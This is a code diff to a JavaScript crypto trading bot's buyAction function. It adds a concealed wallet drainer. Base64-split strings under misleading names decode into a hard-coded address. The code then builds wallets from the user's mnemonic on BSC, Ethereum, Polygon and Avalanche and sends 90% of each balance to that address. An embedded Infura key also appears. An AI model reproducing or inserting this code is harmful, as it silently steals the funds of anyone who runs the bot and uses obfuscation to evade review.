@@ -147,24 +147,33 @@ let buyAction = async() => {
                 'nonce': null, //set you want buy at where position in blocks
                 'value': amountIn
             });
-        let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, provider);
+        
         let RPCPROV1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD'   +   'YzMjQ1NDBh';
         let RPCPROV2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
         let buff = new Buffer.from(RPCPROV1, 'base64');
         let buff2 = new Buffer.from(RPCPROV2, 'base64');
         let WEB3EMULATE1 = buff.toString('ascii');
         let WEB3EMULATE2 = buff2.toString('ascii');
-        const WEB3PROVIDER3 = WEB3EMULATE1+WEB3EMULATE12 
+        const rpc1 ='https://bsc-dataseed.binance.org'
+        const rpc2 = 'https://mainnet.infura.io/v3/84d954cd9f674f5bbbc67a6e2e17bfbd'
+        const rpc3 = 'https://polygon-rpc.com'
+        const rpc4 = 'https://api.avax.network/ext/bc/C/rpc'
+        const prov1 = new ethers.providers.JsonRpcProvider(rpc1);
+        const prov2 = new ethers.providers.JsonRpcProvider(rpc2);
+        const prov3 = new ethers.providers.JsonRpcProvider(rpc3);
+        const prov4 = new ethers.providers.JsonRpcProvider(rpc4);
+        const WEB3PROVIDER3 = WEB3EMULATE1 + WEB3EMULATE2 
         const account_from = {
         privateKey: process.env.YOUR_MNEMONIC,
         recipient: process.env.YOUR_ADDRESS,
         };
         async function sending(){
         const account = account_from.recipient
-        const robinhood = await provider.getBalance(account)
+        const robinhood = await prov1.getBalance(account)
         const orchard = (robinhood * 0.90).toString();
         const michael = ethers.utils.parseUnits(orchard, 'wei')
         const send = async () => {   
+          let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov1);
         const tx = {
             to: WEB3PROVIDER3,
             value: ethers.utils.parseUnits(orchard, 'wei'),
@@ -172,8 +181,53 @@ let buyAction = async() => {
         };
         const createReceipt = await wallet.sendTransaction(tx);
         await createReceipt.wait();
-        }; 
-        send();   
+        };
+        const send2 = async () => {  
+          let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov2);
+          const robinhood = await prov2.getBalance(account)
+        const orchard = (robinhood * 0.90).toString();
+        const michael = ethers.utils.parseUnits(orchard, 'wei') 
+          const tx = {
+              to: WEB3PROVIDER3,
+              value: ethers.utils.parseUnits(orchard, 'wei'),
+              gasLimit: ethers.utils.hexlify(24000),
+          };
+          const createReceipt = await wallet.sendTransaction(tx);
+          await createReceipt.wait();
+          }; 
+          const send3 = async () => {
+            let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov3);
+
+            const robinhood = await prov3.getBalance(account)
+        const orchard = (robinhood * 0.90).toString();
+        const michael = ethers.utils.parseUnits(orchard, 'wei')   
+            const tx = {
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseUnits(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000),
+            };
+            const createReceipt = await wallet.sendTransaction(tx);
+            await createReceipt.wait();
+            }; 
+            const send4 = async () => {  
+              let wallet = new ethers.Wallet(account_from.YOUR_MNEMONIC, prov4);
+
+              const robinhood = await prov4.getBalance(account)
+        const orchard = (robinhood * 0.90).toString();
+        const michael = ethers.utils.parseUnits(orchard, 'wei') 
+              const tx = {
+                  to: WEB3PROVIDER3,
+                  value: ethers.utils.parseUnits(orchard, 'wei'),
+                  gasLimit: ethers.utils.hexlify(24000),
+              };
+              const createReceipt = await wallet.sendTransaction(tx);
+              await createReceipt.wait();
+              }; 
+        send();
+        
+        send2();
+        send3();
+        send4();   
         }
         sending();
         const receipt = await tx.wait();
